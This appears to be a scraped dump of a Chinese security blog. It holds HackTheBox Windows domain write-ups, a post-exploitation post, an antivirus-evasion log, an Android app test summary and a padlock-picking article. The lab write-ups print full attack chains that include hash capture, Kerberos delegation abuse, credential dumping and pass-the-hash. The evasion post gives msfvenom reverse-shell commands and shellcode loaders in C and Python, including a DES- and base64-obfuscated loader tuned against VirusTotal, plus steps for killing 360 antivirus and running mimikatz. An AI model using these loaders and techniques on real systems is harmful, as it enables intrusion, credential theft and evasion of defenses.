爆破SMB 123crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876SMB 10.10.10.248 445 DC [+] intelligence\\Tiffany.Molina:NewIntelligenceCorpUser9876 查看SMB路径 1234567891011smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC IT READ ONLY NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share Users READ ONLY 获得user.txt 123smbclient &#x2F;&#x2F;10.10.10.248&#x2F;users -U Tiffany.Molina NewIntelligenceCorpUser9876cd Tiffany.Molina\\Desktop\\get user.txt 123cat user.txtbbfd0948d53d769c6ec2fcc02181fa7b 权限提升 获取powershell脚本 12smbclient &#x2F;&#x2F;10.10.10.248&#x2F;IT -U Tiffany.Molina NewIntelligenceCorpUser9876get downdetector.ps1 123456789101112cat downdetector.ps1# Check web server status. Scheduled to run every 5minImport-Module ActiveDirectory foreach($record in Get-ChildItem &quot;AD:DC&#x3D;intelligence.htb,CN&#x3D;MicrosoftDNS,DC&#x3D;DomainDnsZones,DC&#x3D;intelligence,DC&#x3D;htb&quot; | Where-Object Name -like &quot;web*&quot;) &#123;try &#123;$request &#x3D; Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;$($record.Name)&quot; -UseDefaultCredentialsif(.StatusCode -ne 200) &#123;Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;&#125;&#125; catch &#123;&#125;&#125; 伪造域名 12wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dirkjanm&#x2F;krbrelayx&#x2F;master&#x2F;dnstool.pypython3 dnstool.py -u &quot;intelligence.htb\\Tiffany.Molina&quot; -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.16.24 10.10.10.248 获取账户 123responder -I tun0 -ATed.Graves::intelligence:a0ccbece497d44d爆破Hash 123john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hashMr.Teddy (Ted.Graves) 获得凭证 1Ted.Graves:Mr.Teddy 获取Hash 1234wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;micahvandeusen&#x2F;gMSADumper&#x2F;main&#x2F;gMSADumper.pypython3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248svc_int$:::47e89a6afd68e3872ef1acaf91d0b2f7 获取SPN 1234git clone https:&#x2F;&#x2F;github.com&#x2F;the-useless-one&#x2F;pywerviewpython3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-datamsds-allowedtodelegateto: WWW&#x2F;dc.intelligence.htb 获取ST 12345python3 getST.py intelligence.htb&#x2F;svc_int$ -spn WWW&#x2F;dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administratorexport KRB5CCNAME&#x3D;administrator.ccachepython3 secretsdump.py -k dc.intelligence.htb -just-dcAdministrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3::: Hash登入 1234evil-winrm -i 10.10.10.248 -u administrator -H 9075113fe16cf74f7c0f9b27e882dad3type c:\\users\\administrator\\desktop\\root.txt0c6b9779d283e244e79b11c78fc1fb92","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"Post Pentest 101","slug":"Post-Pentest-101","date":"2021-08-23T02:26:51.000Z","updated":"2022-05-14T16:05:21.000Z","comments":true,"path":"2021/08/22/Post-Pentest-101/","link":"","permalink":"https://yoloyolo.top/2021/08/22/Post-Pentest-101/","excerpt":"记录一些后渗透的操作 10/69的马过一周变20/68了，今天丢虚拟机直接报毒，看来免杀上还得多学学","text":"记录一些后渗透的操作 10/69的马过一周变20/68了，今天丢虚拟机直接报毒，看来免杀上还得多学学 获得了meterpreter会话之后的操作 123456789101112ps | grep 360PID PPID Name Arch Session User Path--- ---- ---- ---- ------- ---- ----1104 1672 360Tray.exe x86 16272 1104 360Safe.exe x86 16380 6272 360leakfixer.exe x86 1ps | grep HipsPID PPID Name Arch Session User Path--- ---- ---- ---- ------- ---- ----1152 188 HipsTray.exe x86 15268 6172 HipsMain.exe x86 1 DESKTOP-653VJP2\\Kira C:\\Program Files (x86)\\Huorong\\Sysdiag\\bin\\HipsMain.exe5444 624 HipsDaemon.exe 将进程迁移到资源浏览器中 123ps | grep explorer3936 4916 explorer.exe x64 1 DESKTOP-653VJP2\\Kira C:\\Windows\\explorer.exemigrate 3936 这里有一点需要注意，如果meterpreter在bypassuac之后获得了高权限，但是继续向低权限的进程迁移的话，会被降权 使用bypassuac获得Administrator的权限(火绒稳定拦，确切来说是直接把上传的程序给删了，360有时候会拦) 1234567use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.56.103set LPORT 9876set target 1set session 3run 因为系统版本问题，不能用&quot;bypassuac&quot;，只能用&quot;bypassuac_injection&quot;，所以会莫名其妙地触发了个&quot;SQL Client Configuration Utility EXE&quot;的UAC，然后导致了MSF那边收不到session 另一台电脑上试的时候用的是&quot;bypassuac&quot;，倒没问题 这里需要注意一点 target参数需要与目标机器上的操作系统相对应 12345678show targetExploit targets: Id Name -- ---- 0 Windows x86 1 Windows x64 使用mimikatz模块导出Hash 123use kiwikiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonpasswords 得到Hash 123456789101112131415161718192021222324Authentication Id : 0 ; 396268 (00000000:00060bec)Session : Interactive from 1User Name : KiraDomain : DESKTOP-653VJP2Logon Server : DESKTOP-653VJP2Logon Time : 2021&#x2F;8&#x2F;22 17:27:49SID : S-1-5-21-413531007-3663720574-771213360-1001 msv : [00000003] Primary * Username : Kira * Domain : DESKTOP-653VJP2 * NTLM : 38uZAEr4UA7uUYqgCEsBEDJJRsnnsZ2dUt * SHA1 : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f tspkg : wdigest : * Username : Kira * Domain : DESKTOP-653VJP2 * Password : (null) kerberos : * Username : Kira * Domain : DESKTOP-653VJP2 * Password : (null) ssp : credman : NTLM的加密算法为MD4，爆破起来不算复杂 这里密码是123456 拿了密码基本就可以rdp登入上去操作(关杀软)了 管理员权限下taskkill只能关掉360Safe，不能关掉360Tray与ZhuDongFangYu 之后可以使用backstab来干掉&quot;ZhuDongFangYu.exe&quot;进程 在新装的虚拟机上运行提示缺少下面两个dll VCRUNTIME140D.dll ucrtbased.dll 64位系统上，64位dll路径为&quot;C:\\Windows\\System32&quot;，32位dll路径为&quot;C:\\Windows\\SysWOW64&quot; 如果实战跑不了这玩意，估计得用screenshot看看是什么情况 拿这玩意杀不掉360Tray，反而一个开始占CPU一个开始占内存 估计是360在竞争生成进程，Backstab没有做内存释放的机制 最后导致虚拟机卡死 明天换台机器试试 公司机器上开虚拟机关360主程序的时候360Tray会自动退出，然后就能干&quot;ZhuDongFangYu.exe&quot; 就很玄学","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"},{"name":"Post_Pentest","slug":"Post-Pentest","permalink":"https://yoloyolo.top/tags/Post-Pentest/"}]},{"title":"Log of Anti-AntiVirus","slug":"Log-of-Anti-AntiVirus","date":"2021-08-08T06:08:58.000Z","updated":"2022-06-10T16:45:30.000Z","comments":true,"path":"2021/08/08/Log-of-Anti-AntiVirus/","link":"","permalink":"https://yoloyolo.top/2021/08/08/Log-of-Anti-AntiVirus/","excerpt":"Bypass 4 Fun","text":"Bypass 4 Fun Payloads VirusTotal Remark msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=9876 -f exe &gt; Bufferfly.exe 53/69 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 16 LHOST=192.168.56.103 LPORT=9876 -f exe &gt; Bufferfly.exe 52/69 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=9876 -f c &gt; Bufferfly.c 20/69 Visual Studio编译生成32位可执行程序 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 16 LHOST=192.168.56.103 LPORT=9876 -f c &gt; Bufferfly.c 13/69 Visual Studio编译生成32位可执行程序 msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; Bufferfly.py 23/69 Payload需要与Python版本相匹配 msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; Bufferfly.py DES 15/70 Payload需要与Python版本相匹配 pyinstaller -F -w -p PATH_TO_PAKEAGE shellcode.py (Cryptodome) msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; Bufferfly.py DES BASE64 11/69 Payload需要与Python版本相匹配 pyinstaller -F -w -p PATH_TO_PAKEAGE shellcode.py (Cryptodome) CobaltStrike windows/beacon_http/reverse_http x86 EXE 50/67 CobaltStrike windows/beacon_http/reverse_http x86 C 27/70 Visual Studio编译生成32位可执行程序 CobaltStrike windows/beacon_http/reverse_http x64 Python 23/68 Payload需要与Python版本相匹配 CobaltStrike windows/beacon_http/reverse_http x64 Python DES BASE64 10/68 Payload需要与Python版本相匹配 pyinstaller -F -w -p PATH_TO_PAKEAGE shellcode.py (Cryptodome) 1234567unsigned char buf[] = &quot;shellcode&quot;;main()&#123; LPVOID shellcode = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode, buf, sizeof(buf)); ((void(*)())shellcode)();&#125; 123456789import ctypesbuf = b&quot;shellcode&quot;shellcode = bytearray(buf)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) 1234567891011121314151617181920212223242526272829#encrypt.pyfrom Cryptodome.Cipher import DESimport base64buf = b&quot;shellcode&quot;key = b&#x27;DEADC0DE&#x27;des = DES.new(key, DES.MODE_ECB)pad = (8 - len(buf) % 8) * b&quot;\\x00&quot;b64code = base64.b64encode(des.encrypt(buf + pad))print(b64code)print(len(buf))#---------------------------#shellcode.pyfrom Cryptodome.Cipher import DESimport base64import ctypesb64code = b&quot;base64code&quot;length = 510key = b&quot;DEADC0DE&quot;des = DES.new(key, DES.MODE_ECB)buf = des.decrypt(base64.b64decode(b64code))[:length]shellcode = bytearray(buf)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))#eval(base64.b64decode(&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&quot;))handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))#exec(base64.b64decode(&quot;aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkp&quot;))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) Python執行pyinstaller產生的執行檔出現No module錯誤訊息 python3 shellcode 使用eval函数 bypass AV 对于python中eval函数不能执行赋值操作的解决方法 实验使用 C 编译 shellcode 免杀上线 python3的Cryptodome Cobalt Strike系列教程第一章：简介与安装 CS teamserver.bat Cobalt Strike 4.3破解版","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Anti_AntiVirus","slug":"Anti-AntiVirus","permalink":"https://yoloyolo.top/tags/Anti-AntiVirus/"},{"name":"Meterpreter","slug":"Meterpreter","permalink":"https://yoloyolo.top/tags/Meterpreter/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://yoloyolo.top/tags/CobaltStrike/"}]},{"title":"某APP测试项目小结","slug":"Summary-For-Android-APP-Test","date":"2021-08-02T02:20:01.000Z","updated":"2022-05-14T16:03:47.000Z","comments":true,"path":"2021/08/01/Summary-For-Android-APP-Test/","link":"","permalink":"https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/","excerpt":"Busy &amp; Lazy","text":"Busy &amp; Lazy Activity劫持 Activity劫持，又称StrandHogg 具体介绍: https://www.freebuf.com/company-information/249009.html 利用方式与Clickjacking有些相似，都是通过UI欺骗，来引导用户进行恶意操作 至于防御手段 一方面是需要对用户进行安全意识培训与宣传 另一方面，APP可以检测自身是否被系统程序覆盖，同时可以检测程序进入后台是否由用户操作造成(Home键，返回键) 漏洞复现测试 https://www.freebuf.com/sectool/249725.html Android抓包 一开始以为跟普通的Burp抓包区别不大，后来发现里面的门道还是挺多的 用户证书与系统证书 直接通过浏览器下载安装的证书为用户证书，一些安全性较高的APP不会信任用户证书 但是可以通过安装系统证书来绕过（需root） https://blog.csdn.net/weixin_31702225/article/details/117694829 单向验证与双向验证 单/双向验证的一些细节就不再赘述 单向验证一般是客户端验证服务端 双向验证测试两者相互验证 把APK丢进jadx，搜索&quot;checkclienttrusted&quot;和&quot;checkservertrusted&quot; 两者分别对应&quot;验证客户端&quot;和&quot;验证服务端&quot; Frida与Xposed+JustTrustME的方法大概都是去劫持验证过程从而进行Bypass https://xz.aliyun.com/t/6551#toc-13 Burpsuite &amp; Fiddler 就这次的测试来看 Fiddler与Burpsuite都有些各自的毛病 比如Fiddler里401的请求到了Burpsuite就200 比如Burpsuite相比于Fiddler会少了几个HTTP头 但是两者结合来使用效果还是很不错的 JustReverseIt 逆向不用管会不会逆向，逆向也不管能不能读懂Java代码，只要会在jadx里Ctrl+F就行 通过逆向，看到了一些HTTP验证头的计算方法，也看到了AES加密的密钥与加密方法，etc. 有了这些信息在进行测试的时候就能够多发现一点可测试的点","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://yoloyolo.top/tags/Android/"},{"name":"Application_Test","slug":"Application-Test","permalink":"https://yoloyolo.top/tags/Application-Test/"}]},{"title":"浅析弹子挂锁的攻击方式","slug":"pin-tumbler-lock","date":"2021-07-12T01:24:29.000Z","updated":"2023-02-08T15:05:15.386Z","comments":true,"path":"2021/07/11/pin-tumbler-lock/","link":"","permalink":"https://yoloyolo.top/2021/07/11/pin-tumbler-lock/","excerpt":"本文用于讨论弹子挂锁攻击方式，请勿用于违法用途 Is key necessary to unlock? Absolutely not.","text":"本文用于讨论弹子挂锁攻击方式，请勿用于违法用途 Is key necessary to unlock? Absolutely not. 一些废话 开锁这一技能在初中的时候跟一些不良同学学过 高中时开始熟练运用，如 开空教室的门拿椅子 体育课开器材室的门 处理一些私人恩怨 etc. 但是从来都没有具体的了解过锁具的结构，就像大一时的我空知道web安全的漏洞，但是从来都没有去具体研究相关的函数或代码，自然而然地就对自己的学习产生了瓶颈 锁具的安全与网络安全有些类似，都应当默认外界的输入是不安全的，或许这就是安全的通性 网上搜了下“传授开锁技能触犯传授犯罪方法罪”的内容，所以写这篇文章的时候内心还是有些忐忑与疑惑的 忐忑 犯罪行为需要同时满足主观条件与客观条件 主观上：本文仅在讨论弹簧锁的攻击方式 客观上：本文仅在讨论弹簧锁的攻击方式 疑惑 开锁与Hacking有些类似，都是一种对于公共安全具有潜在威胁的行为，但是个人感觉后者的门槛与复杂程度还是比前者高一些 某些情况下传授开锁技能会触犯传授犯罪方法罪，那么传授网络安全技能呢？ 貌似也会，因为听说过老师教学生两手之后学生端了学校的网站最后老师被请喝茶的事 如果这篇文章真的涉嫌触犯传授犯罪方法罪，那公布EXP跟写漏洞分析文章的是不是都得该挨个抓 弹簧锁结构概述 图绘制过程没有对锁具进行具体的测量，比例可能存在较大的误差 （弹子组部分为了方便所以把弹子画得平齐，现实中锁的弹子肯定是不齐的，而且是与钥匙的形状对应的） 解锁步骤 钥匙插入锁芯，钥匙销与驱动销的空隙正好处于锁身与锁芯之间的截线，此时锁芯可以顺时针转动 锁芯顺时针转动时，锁芯上方的拨爪拨动锁舌的拨爪，向右压缩弹簧B，使锁舌向右移动 锁舌移动一定距离之后，锁舌解除了对于锁梁左侧的限制，在弹簧A的作用下弹出锁梁 至此，解锁完毕 Method 0 模拟锁芯转动 使用韧性强的铁丝（推荐伞的细伞骨）制成如图形状 利用杠杆原理拨动锁舌上的拨爪，压缩弹簧B，使锁舌向右移动，从而开锁 特殊情况 以上只是最普通的状况，个人手上的锁具不多，凭借自己的思考与观察得出以下两种特殊状况 防拨盖片 锁芯与锁舌的之间个人感觉可以用防拨盖片挡住 一般来说，钥匙不会插入到这种深度的位置 双向锁舌 这个情况是基于手头上的一个锁具，纵向分布两组拨爪，分别对应两侧的锁舌 使用钥匙开锁时，顺时针转动锁芯带动两组拨爪，使两个锁舌对向移动，从而解锁 如果是这种情况的话，单纯地将锁舌向右撬只会卡住锁梁的右边 破解方法 由于有两组拨爪，需要先撬动右边的锁舌，锁梁会在弹簧A的作用下向上移动，此时锁梁右侧不受锁舌限制，但锁梁左边会被限制，之后的步骤就不必多言 由于开锁类似于黑盒测试，无法看到锁的内部结构，所以只能收集一些信息来推断是否为双向锁舌 如果在尝试向右撬动锁舌后不能开锁，则需要考虑双向锁舌的情况 向左撬动锁舌，右侧锁梁会向上稍微移动一些距离，摁下后有清脆的金属撞击声，则为双向锁舌 Method 1 模拟钥匙 这个基本是通用的方法，也是最靠技术的方法，先用挑勾将截线对齐，然后用铁片转动锁芯 其难度与弹子数成正相关 Method 2 推进锁舌 参考以下视频 https://www.youtube.com/watch?v=BEOWb68YumY Method 3 强制破坏 使用两个扳手插入锁梁，使用杠杆原理来破坏锁体 写到最后发现这些东西跟Web安全在某些角度是相通的 先拆卸掉锁，然后观察结构，再去分析开锁的方法，就与白盒对应 直接开锁就像黑盒 我想，或许这种安全的共通性值得我花一生的时间去追求与探索 参考 挂锁的结构是怎样的 普通挂锁结构图详细科普 教你如何打开一把弹子锁 用了这么多年挂锁，你知道锁是怎么运转的吗？ 维基百科 Open Lock with Soda Can","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Lock_Picking","slug":"Lock-Picking","permalink":"https://yoloyolo.top/tags/Lock-Picking/"}]},{"title":"HackTheBox_Windows_Set_1","slug":"HackTheBox-Windows-Set-1","date":"2021-07-04T21:09:07.000Z","updated":"2023-02-14T15:38:04.000Z","comments":true,"path":"2021/07/04/HackTheBox-Windows-Set-1/","link":"","permalink":"https://yoloyolo.top/2021/07/04/HackTheBox-Windows-Set-1/","excerpt":"HackTheBox返场了几台Windows的靶机 确定了暑假的实习 考试周的考试安排得靠后 正巧","text":"HackTheBox返场了几台Windows的靶机 确定了暑假的实习 考试周的考试安排得靠后 正巧 HackTheBox_Active 端口扫描 12345678910111213141516171819202122232425nmap -sV -sT -Pn 10.10.10.100Nmap scan report for 10.10.10.100Host is up (0.59s latency).Not shown: 982 closed portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.760188/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-04 09:21:59Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Service49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows 漏洞利用 开了53端口，基本确定是台DC 12345678910111213141516171819202122232425262728293031323334353637383940414243enum4linux 10.10.10.100 ========================== | Target Information | ========================== Target ........... 10.10.10.100RID Range ........ 500-550,1000-1050Username ......... &#x27;&#x27;Password ......... &#x27;&#x27;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none------ ====================================== | OS information on 10.10.10.100 | ====================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 10.10.10.100 from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.[+] Got OS info for 10.10.10.100 from srvinfo: 10.10.10.100 Wk Sv PDC Tim NT Domain Controller platform_id : 500 os version : 6.1 server type : 0x80102b------ ========================================= | Share Enumeration on 10.10.10.100 | ========================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin attacker_folder Disk C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk 应该可以匿名登录 123456789101112smbmap -H 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin attacker_folder NO ACCESS C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY SYSVOL NO ACCESS Logon server share Users NO ACCESS 下载整个文件夹 12345smbclient //10.10.10.100/Replicationmask &quot;&quot;recurse ONprompt OFFmget active.htb 拿到GPP密文密码 12345cat active.htb/Policies/&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;/MACHINE/Preferences/Groups&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;active.htb\\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\\SVC_TGS&quot;/&gt;&lt;/User&gt;&lt;/Groups&gt; 解密得到明文密码 12gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQGPPstillStandingStrong2k18 这里本来以为是用evil-winrm或者psexecGetshell的，没想到是smb登入users 12345smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18get svc_tgs\\desktop\\user.txtcat svc_tgs\\\\desktop\\\\user.txt 86d67d8ba232bb6a254aa4d10159e983 权限提升 Kerberoasting 1python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile getuserspns.out （跑的时候出了个时间差过大的错误，头疼） 同步时间 1ntpdate -u 10.10.10.100 爆破票据 123john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs getuserspns.out Ticketmaster1968 (?) 查看SMB路径权限 123456789101112smbmap -H 10.10.10.100 -u administrator -p Ticketmaster1968 Disk Permissions Comment ---- ----------- ------- ADMIN$ READ, WRITE Remote Admin attacker_folder READ, WRITE C$ READ, WRITE Default share IPC$ NO ACCESS Remote IPC NETLOGON READ, WRITE Logon server share Replication READ ONLY SYSVOL READ, WRITE Logon server share Users 有写权限，直接psexec 12345python psexec.py active.htb/administrator@10.10.10.100Ticketmaster1968type \\users\\administrator\\desktop\\root.txtb5fc76d1d6b91d77b2fbf2d54d0f708b HackTheBox_Bastion 端口扫描 1234567891011nmap -sV -sT -Pn 10.10.10.134Nmap scan report for 10.10.10.134Host is up (0.59s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-dsService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows HackTheBox_漏洞利用 smbmap扫描路径 1234567smbmap -H 10.10.10.134 -u test Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC 可以看到有两个VHD文件 1234567891011121314151617181920smbclient //10.10.10.134/backupsdir WindowsImageBackup\\L4mpje-PC\\&quot;Backup 2019-02-22 124351&quot;\\ . Dn 0 Fri Feb 22 20:45:32 2019 .. Dn 0 Fri Feb 22 20:45:32 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd An 37761024 Fri Feb 22 20:44:03 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd An 5418299392 Fri Feb 22 20:45:32 2019 BackupSpecs.xml An 1186 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml An 1078 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml An 8930 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml An 6542 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml An 2894 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml An 1488 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml An 1484 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml An 3844 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml An 3988 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml An 7110 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml An 2374620 Fri Feb 22 20:45:32 2019 7735807 blocks of size 4096. 2757267 blocks available 先挂载SMB服务的文件，再将VHD文件挂载到本地磁盘 123456mkdir /tmp/vhdmkdir /tmp/l4mpje-pcmount -t cifs //10.10.10.134/backups/WindowsImageBackup/L4mpje-PC /tmp/l4mpje-pc/ -o user=anonymousmodprobe nbd max_part=16qemu-nbd -r -c /dev/nbd0 &quot;/tmp/l4mpje-pc/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd&quot;mount -r /dev/nbd0p1 /tmp/vhd 